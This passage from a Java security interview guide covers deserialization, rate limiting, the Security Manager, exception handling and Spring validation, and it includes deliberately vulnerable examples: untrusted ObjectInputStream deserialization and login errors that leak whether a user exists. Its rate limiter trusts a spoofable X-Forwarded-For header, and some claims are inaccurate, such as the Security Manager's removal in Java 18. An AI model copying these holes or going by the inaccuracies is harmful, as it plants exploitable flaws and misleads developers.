    @NotBlank @Size(min = 8, max = 100)
    private String password;
}

// ✅ 6. Secure HTTP headers
// HSTS: force HTTPS
response.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
// Don't expose server info
response.setHeader("X-Powered-By", ""); // Remove framework disclosure

// ✅ 7. Principle of Least Privilege
// DB user should only have SELECT/INSERT/UPDATE — never DROP/GRANT
// Service accounts should have only required permissions
```

</details>

---

### 🟡 Q16. What is insecure deserialization and how do you prevent it?

<details><summary>Click to reveal answer</summary>

**Insecure deserialization** occurs when untrusted data is deserialized, potentially leading to remote code execution (RCE), DoS, or authentication bypass.

```java
// ❌ VULNERABLE: Deserializing untrusted data
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // DANGER! Can execute arbitrary code!

// Famous examples: Apache Commons Collections gadget chain, Log4Shell

// ✅ Prevention 1: Avoid Java serialization for data exchange (use JSON/XML)
// Replace serialized objects with JSON:
ObjectMapper mapper = new ObjectMapper();
UserDto userDto = mapper.readValue(requestBody, UserDto.class);
// Jackson only deserializes to the specified class — safe

// ✅ Prevention 2: If you must deserialize, whitelist allowed classes
public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> ALLOWED = Set.of(
        "com.example.model.UserData",
        "java.util.ArrayList",
        "java.lang.String"
    );

    public SafeObjectInputStream(InputStream in) throws IOException { super(in); }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        if (!ALLOWED.contains(osc.getName())) {
            throw new InvalidClassException("Unauthorized deserialization: " + osc.getName());
        }
        return super.resolveClass(osc);
    }
}

// ✅ Prevention 3: Validate data integrity with HMAC before deserializing
public byte[] serialize(Object obj) throws IOException {
    byte[] data = toBytes(obj);
    byte[] hmac = computeHmac(data, secretKey);
    return concat(hmac, data);
}

public Object deserialize(byte[] received) throws IOException {
    byte[] hmac = Arrays.copyOf(received, 32);
    byte[] data = Arrays.copyOfRange(received, 32, received.length);
    if (!MessageDigest.isEqual(hmac, computeHmac(data, secretKey))) {
        throw new SecurityException("Data integrity check failed");
    }
    return fromBytes(data);
}

// ✅ Prevention 4: Use JSON with strict type handling
ObjectMapper mapper = new ObjectMapper();
mapper.disableDefaultTyping(); // Prevents polymorphic type attacks
// Jackson's @JsonTypeInfo with allowlist
```

</details>

---

### 🔴 Q17. Explain how to implement rate limiting to prevent brute-force attacks.

<details><summary>Click to reveal answer</summary>

```java
// Rate limiting with Bucket4j (token bucket algorithm)
@Service
public class RateLimitService {
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    // Allow 5 login attempts per minute per IP
    private Bucket createLoginBucket() {
        Bandwidth limit = Bandwidth.classic(5, Refill.intervally(5, Duration.ofMinutes(1)));
        return Bucket.builder().addLimit(limit).build();
    }

    public boolean tryConsume(String clientKey) {
        Bucket bucket = buckets.computeIfAbsent(clientKey, k -> createLoginBucket());
        return bucket.tryConsume(1);
    }
}

// Rate limiting filter
@Component
public class LoginRateLimitFilter extends OncePerRequestFilter {

    @Autowired private RateLimitService rateLimitService;

    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse resp,
                                    FilterChain chain) throws ServletException, IOException {
        if ("/login".equals(req.getServletPath()) && "POST".equals(req.getMethod())) {
            String clientIp = getClientIp(req);
            if (!rateLimitService.tryConsume(clientIp)) {
                resp.setStatus(429);
                resp.setHeader("Retry-After", "60");
                resp.setHeader("X-RateLimit-Remaining", "0");
                resp.getWriter().write("{\"error\":\"Too many login attempts. Try again later.\"}");
                return;
            }
        }
        chain.doFilter(req, resp);
    }

    private String getClientIp(HttpServletRequest request) {
        String forwarded = request.getHeader("X-Forwarded-For");
        if (forwarded != null) {
            return forwarded.split(",")[0].trim();
        }
        return request.getRemoteAddr();
    }
}

// Account lockout after N failed attempts
@Service
public class AccountLockoutService {

    @Autowired private RedisTemplate<String, Integer> redis;

    private static final int MAX_ATTEMPTS = 5;
    private static final Duration LOCKOUT_DURATION = Duration.ofMinutes(15);

    public void recordFailedAttempt(String username) {
        String key = "login:attempts:" + username;
        Integer attempts = redis.opsForValue().increment(key).intValue();
        redis.expire(key, LOCKOUT_DURATION);

        if (attempts >= MAX_ATTEMPTS) {
            redis.opsForValue().set("login:locked:" + username, 1, LOCKOUT_DURATION);
        }
    }

    public boolean isLocked(String username) {
        return Boolean.TRUE.equals(redis.hasKey("login:locked:" + username));
    }

    public void resetAttempts(String username) {
        redis.delete("login:attempts:" + username);
        redis.delete("login:locked:" + username);
    }
}
```

</details>

---

### 🟡 Q18. What is the Java Security Manager and what replaced it?

<details><summary>Click to reveal answer</summary>

**Java Security Manager** (deprecated in Java 17, removed in Java 18) was a mechanism to restrict what code could do — file system access, network calls, reflection, etc.

```java
// OLD WAY (pre-Java 17): Security Manager (now deprecated)
System.setSecurityManager(new SecurityManager() {
    @Override
    public void checkRead(String file) {
        if (!file.startsWith("/allowed/path")) {
            throw new SecurityException("File access denied: " + file);
        }
    }

    @Override
    public void checkConnect(String host, int port) {
        if (!"trusted.com".equals(host)) {
            throw new SecurityException("Network access denied to: " + host);
        }
    }
});

// Modern alternatives:
// 1. Container isolation (Docker, Kubernetes) — process-level isolation
// 2. Network policies — restrict outbound connections at infrastructure level
// 3. JEP 411 alternatives — OS-level sandboxing (seccomp, AppArmor)
// 4. Module system (Java 9+) — encapsulation without Security Manager
// 5. GraalVM sandbox — strict isolation for untrusted code

// Module system as access control:
// module-info.java
// module com.example.core {
//     exports com.example.api;    // Only these packages visible
//     // com.example.internal — hidden!
// }
```

> 💡 **Interviewer Tip:** If asked about Security Manager, show you know it was deprecated and explain modern alternatives (containers, OS-level security, modules). This shows up-to-date knowledge.

</details>

---

### 🟢 Q19. How should you handle security-sensitive exceptions?

<details><summary>Click to reveal answer</summary>

```java
// ❌ BAD: Leaking information through exception messages
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    try {
        User user = userRepo.findByUsername(req.getUsername())
            .orElseThrow(() -> new ResponseStatusException(404, "User not found")); // Reveals user existence!
        if (!encoder.matches(req.getPassword(), user.getHashedPassword())) {
            throw new ResponseStatusException(401, "Wrong password"); // Reveals which field was wrong!
        }
    }
}

// ✅ GOOD: Generic error message (doesn't reveal whether username exists)
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest req) {
    try {
        return authService.authenticate(req.getUsername(), req.getPassword())
            .map(token -> ResponseEntity.ok(new TokenResponse(token)))
            .orElse(ResponseEntity.status(401)
                .body(new ErrorResponse("Invalid username or password"))); // Same message!
    } catch (Exception e) {
        log.warn("Login failed for user: {}", req.getUsername()); // Log internally
        return ResponseEntity.status(401)
            .body(new ErrorResponse("Invalid username or password"));
    }
}

// ✅ Constant-time comparison to prevent timing attacks
// Different time to say "user not found" vs "wrong password" leaks info
public boolean secureCompare(String a, String b) {
    return MessageDigest.isEqual(
        a.getBytes(StandardCharsets.UTF_8),
        b.getBytes(StandardCharsets.UTF_8)
    ); // Constant time regardless of where strings differ
}

// ✅ Global exception handler — never expose stack traces
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleAll(Exception e, HttpServletRequest req) {
        String requestId = UUID.randomUUID().toString();
        log.error("Unhandled exception [requestId={}]", requestId, e); // Log full exception

        return ResponseEntity.status(500)
            .body(new ErrorResponse(
                "An internal error occurred. Reference: " + requestId
                // Never include e.getMessage() or stack trace in response!
            ));
    }
}
```

</details>

---

### 🟡 Q20. How do you implement input validation and sanitization in Spring?

<details><summary>Click to reveal answer</summary>

```java
// Bean Validation (Jakarta Validation / JSR-380)
import jakarta.validation.constraints.*;

public class UserRegistrationRequest {

    @NotBlank(message = "Username is required")
    @Size(min = 3, max = 50, message = "Username must be 3-50 characters")
    @Pattern(regexp = "^[a-zA-Z0-9_]+$", message = "Username can only contain letters, numbers, underscores")
    private String username;

    @NotBlank @Email(message = "Invalid email format")
    private String email;

    @NotBlank
    @Size(min = 8, message = "Password must be at least 8 characters")
    @Pattern(
        regexp = "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[@$!%*?&])[A-Za-z\\d@$!%*?&]{8,}$",
        message = "Password must contain uppercase, lowercase, digit, and special character"
    )
    private String password;

    @Min(value = 0, message = "Age cannot be negative")
    @Max(value = 150, message = "Age seems unrealistic")
    private Integer age;

    @URL @NotNull
    private String profileUrl;
}

// Controller — @Valid triggers validation
@RestController
public class UserController {

    @PostMapping("/users")
    public ResponseEntity<UserResponse> createUser(
            @Valid @RequestBody UserRegistrationRequest request) {
        // If validation fails, MethodArgumentNotValidException is thrown
        return ResponseEntity.ok(userService.create(request));
    }
}

// Custom validation annotation
@Documented
@Constraint(validatedBy = PhoneNumberValidator.class)
@Target({ElementType.FIELD})
@Retention(RetentionPolicy.RUNTIME)
public @interface ValidPhone {
    String message() default "Invalid phone number";
    Class<?>[] groups() default {};
    Class<? extends Payload>[] payload() default {};
}

public class PhoneNumberValidator implements ConstraintValidator<ValidPhone, String> {
    private static final Pattern PHONE_PATTERN = Pattern.compile("^\\+?[1-9]\\d{9,14}$");

    @Override
    public boolean isValid(String phone, ConstraintValidatorContext ctx) {
        if (phone == null) return true; // Use @NotNull for null checks
        return PHONE_PATTERN.matcher(phone).matches();
    }
}

// Handle validation errors
@ExceptionHandler(MethodArgumentNotValidException.class)
public ResponseEntity<Map<String, String>> handleValidation(MethodArgumentNotValidException ex) {
    Map<String, String> errors = ex.getBindingResult().getFieldErrors().stream()
        .collect(Collectors.toMap(
            FieldError::getField,
            FieldError::getDefaultMessage,
            (e1, e2) -> e1
        ));
    return ResponseEntity.badRequest().body(errors);
}
```

</details>

---

*End of Java Security*
